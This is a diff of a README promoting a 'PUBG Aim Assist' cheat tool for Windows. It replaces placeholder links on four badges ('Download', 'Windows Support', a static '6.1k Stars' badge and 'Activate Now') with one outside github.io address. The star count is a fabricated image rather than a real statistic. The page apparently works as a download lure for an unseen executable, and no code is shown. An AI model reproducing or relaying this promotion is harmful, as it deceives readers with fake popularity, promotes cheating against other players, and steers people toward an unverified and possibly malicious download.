@@ -8,10 +8,10 @@ Winning in *PUBG* comes down to precision and control. The **PUBG Aim Assist too
 
 Every duel in PUBG can decide whether you’re collecting loot or staring at the death screen. Aim Assist takes away the inconsistency of shaky aim and ensures that your shots stay on target. From long-range sniping to frantic close-quarter battles, this tool adapts to your playstyle.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 6.1k Stars](https://img.shields.io/badge/GitHub-⭐️%206.1k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://pubg-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://pubg-aim-assist.github.io/.github/)
+[![⭐️ 6.1k Stars](https://img.shields.io/badge/GitHub-⭐️%206.1k%20Stars-black?style=for-the-badge\&logo=github)](https://pubg-aim-assist.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://pubg-aim-assist.github.io/.github/)
 
 ---
 
